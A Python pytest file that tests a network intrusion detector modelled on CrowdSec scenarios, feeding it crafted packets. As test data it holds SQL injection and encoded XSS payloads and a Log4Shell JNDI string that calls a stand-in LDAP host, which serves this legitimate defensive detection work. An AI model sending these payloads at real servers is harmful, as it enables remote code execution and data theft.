"""CrowdSec 동등 시나리오 테스트 (패킷에서 만든 사건 + leaky bucket)."""
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.packet import Raw

from netcare.capture.parser import parse_http, parse_packet
from netcare.config import DetectionConfig
from netcare.detection.crowdsec_compat import SCENARIOS, Bucket
from netcare.detection.detector import Detector
from netcare.diagnosis.explainer import explain

SRV, SRV_MAC = "192.168.10.50", "02:00:00:00:10:50"     # 내가 운영하는 웹·FTP·SSH 서버
ATK = "205.174.165.73"
T0 = 1_700_000_000


def det(**kw):
    return Detector(DetectionConfig(**kw), {SRV}, {SRV_MAC}, gateway_ip="192.168.10.1")


def pkt(src, dst, sport, dport, flags, payload=b"", ts=T0):
    smac, dmac = ("02:00:00:00:00:66", SRV_MAC) if dst == SRV else (SRV_MAC, "02:00:00:00:00:66")
    p = Ether(src=smac, dst=dmac) / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags=flags, seq=1, ack=1)
    if payload:
        p = p / Raw(payload)
    q = p.__class__(bytes(p))
    q.time = ts
    return parse_packet(q, {SRV}, {SRV_MAC})


def req(path, ua="Mozilla/5.0", method="GET"):
    return f"{method} {path} HTTP/1.1\r\nHost: shop.example\r\nUser-Agent: {ua}\r\n\r\n".encode()


def by_scenario(found):
    return {a["evidence"].get("scenario"): a for a in found if a.get("evidence", {}).get("scenario")}


def test_parse_http_request_and_response():
    h = parse_http(req("/a?x=1", ua="curl/8"))
    assert h == {"kind": "req", "method": "GET", "uri": "/a?x=1", "host": "shop.example", "ua": "curl/8", "referer": ""}
    assert parse_http(b"HTTP/1.1 404 Not Found\r\n\r\n") == {"kind": "resp", "status": 404}
    assert parse_http(b"\x16\x03\x01garbage") is None


def test_leaky_bucket_matches_crowdsec_semantics():
    sc = SCENARIOS["ssh_bf"]                 # capacity 5, leakspeed 10s
    b = Bucket(sc.capacity, T0)
    assert [b.pour(sc, T0 + i * 0.1, None) for i in range(6)] == [False] * 5 + [True]
    slow = Bucket(sc.capacity, T0)           # 11초 간격이면 계속 새어 나가 넘치지 않음
    assert not any(slow.pour(sc, T0 + i * 11, None) for i in range(20))
    d = SCENARIOS["http_probing"]            # distinct: 같은 경로는 한 번만
    b = Bucket(d.capacity, T0)
    assert not any(b.pour(d, T0 + i * 0.01, "/same") for i in range(50))


def test_sqli_probing_overflows_after_capacity():
    d = det()
    for i in range(11):
        d.observe(pkt(ATK, SRV, 40000 + i, 80, "PA", req(f"/item.php?id={i}%20union%20select%20null,{i}"), T0 + i * 0.05))
    hit = by_scenario(d.evaluate(T0 + 2)).get("http_sqli")
    assert hit and hit["type"] == "web_attack" and hit["src"] == ATK and hit["evidence"]["crowdsec"].endswith("sqli-probbing-detection")
    assert "SQL" in explain(hit, {"local_ips": {SRV}})["title"]
    d = det()                                # 10개까지는 넘치지 않음 (capacity 10)
    for i in range(10):
        d.observe(pkt(ATK, SRV, 40000 + i, 80, "PA", req(f"/item.php?id={i}%20union%20select%20null"), T0 + i * 0.05))
    assert "http_sqli" not in by_scenario(d.evaluate(T0 + 2))


def test_log4shell_is_single_event_trigger():
    d = det()
    d.observe(pkt(ATK, SRV, 41000, 8080, "PA", req("/", ua="${jndi:ldap://203.0.113.66/a}"), T0))
    hit = by_scenario(d.evaluate(T0 + 2)).get("http_log4j")
    assert hit and hit["severity"] == "danger" and "${JNDI:" in hit["evidence"]["matches"]


def test_http_probing_uses_response_codes():
    d = det()
    for i in range(12):
        d.observe(pkt(ATK, SRV, 42000 + i, 80, "PA", req(f"/old/page{i}.php"), T0 + i * 0.1))
        d.observe(pkt(SRV, ATK, 80, 42000 + i, "PA", b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n", T0 + i * 0.1 + 0.01))
    hit = by_scenario(d.evaluate(T0 + 3)).get("http_probing")
    assert hit and hit["type"] == "web_scan"


def test_normal_browsing_is_quiet():
    d = det()
    pages = ["/", "/index.html", "/style.css", "/app.js", "/logo.png", "/products", "/about", "/contact"]
    for i in range(30):
        path = pages[i % len(pages)]
        d.observe(pkt("192.168.10.20", SRV, 43000 + i, 80, "PA", req(path), T0 + i * 0.5))
        d.observe(pkt(SRV, "192.168.10.20", 80, 43000 + i, "PA", b"HTTP/1.1 200 OK\r\n\r\n", T0 + i * 0.5 + 0.01))
    found = d.evaluate(T0 + 16)
    assert not [a for a in found if a["type"] in ("web_attack", "web_scan", "auth_bruteforce")]


def test_ftp_bruteforce_from_530_replies():
    d = det()
    for i in range(7):
        d.observe(pkt(SRV, ATK, 21, 45000, "PA", b"530 Login incorrect.\r\n", T0 + i * 0.4))
    hit = by_scenario(d.evaluate(T0 + 4)).get("ftp_bf")
    assert hit and hit["type"] == "auth_bruteforce" and hit["src"] == ATK and hit["evidence"]["certainty"] == "measured"


def test_ssh_bruteforce_by_connection_attempts_is_suspected():
    d = det()
    for i in range(8):
        d.observe(pkt(ATK, SRV, 46000 + i, 22, "S", ts=T0 + i * 0.3))
    hit = by_scenario(d.evaluate(T0 + 4)).get("ssh_bf")
    assert hit and hit["evidence"]["certainty"] == "suspected"
    assert "의심" in explain(hit, {"local_ips": {SRV}})["title"]


def test_multi_port_scan_counts_only_closed_ports():
    d = det()
    for i in range(20):
        d.observe(pkt(ATK, SRV, 47000, 1000 + i, "S", ts=T0 + i * 0.05))
    hit = by_scenario(d.evaluate(T0 + 3)).get("scan_multi_ports")
    assert hit and hit["type"] == "port_scan"
    assert "포트" in explain(hit, {"local_ips": {SRV}})["title"]
    d = det()                                # 열려 있는 서비스(SYN-ACK 응답)로 가는 연결은 세지 않음
    for i in range(20):
        port = 8000 + (i % 3)
        d.observe(pkt(SRV, ATK, port, 47000 + i, "SA", ts=T0 + i * 0.05 - 0.001)) if i < 3 else None
        d.observe(pkt(ATK, SRV, 47000 + i, port, "S", ts=T0 + i * 0.05))
    assert "scan_multi_ports" not in by_scenario(d.evaluate(T0 + 3))


def test_compat_can_be_disabled():
    d = det(crowdsec_compat=False)
    d.observe(pkt(ATK, SRV, 41000, 80, "PA", req("/", ua="${jndi:ldap://x/a}"), T0))
    assert "http_log4j" not in by_scenario(d.evaluate(T0 + 2))


# ─────────────── NetCare 확장 (CrowdSec 에 없는 조건) ───────────────
def test_encoded_xss_missed_by_crowdsec_condition_but_caught_after_decoding():
    """CSE-CIC-IDS2018 의 실제 XSS 요청처럼 URL 인코딩된 페이로드."""
    d = det()
    for i in range(8):
        q = f"/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Econsole.log%28{i}%29%3C%2Fscript%3E&user_token={i}"
        d.observe(pkt(ATK, SRV, 48000 + i, 80, "PA", req(q), T0 + i))
    sc = by_scenario(d.evaluate(T0 + 9))
    assert "http_xss" not in sc                      # CrowdSec 과 같은 조건(원문 비교)으로는 못 잡음
    hit = sc.get("ext_xss_decoded")
    assert hit and hit["evidence"]["netcare_extension"] is True and hit["evidence"]["crowdsec"] is None
    assert "NetCare 확장" in explain(hit, {"local_ips": {SRV}})["summary"]


def test_manual_sqli_slow_requests():
    d = det()
    for i, q in enumerate(["3+%27", "3+%27+and+1%3D1+order+by+3%23", "3+%27+and+1%3D1+order+by+2+%23", "3+%27+and+1%3D0+order+by+2+%23"]):
        d.observe(pkt(ATK, SRV, 49000 + i, 80, "PA", req(f"/DVWA/vulnerabilities/sqli/?id={q}&Submit=Submit"), T0 + i * 10))
    sc = by_scenario(d.evaluate(T0 + 32))
    assert "http_sqli" not in sc and sc.get("ext_sqli") and sc["ext_sqli"]["severity"] == "danger"


def test_web_login_bruteforce_and_normal_login():
    d = det()
    for i in range(15):
        d.observe(pkt(ATK, SRV, 50000 + i, 80, "PA", req("/DVWA/login.php", method="POST"), T0 + i * 0.5))
    hit = by_scenario(d.evaluate(T0 + 8)).get("ext_http_login_bf")
    assert hit and hit["type"] == "auth_bruteforce"
    d = det()
    for i in range(3):                               # 정상 사용자: 몇 번 틀리고 로그인
        d.observe(pkt("192.168.10.20", SRV, 51000 + i, 80, "PA", req("/login", method="POST"), T0 + i * 5))
    assert "ext_http_login_bf" not in by_scenario(d.evaluate(T0 + 16))
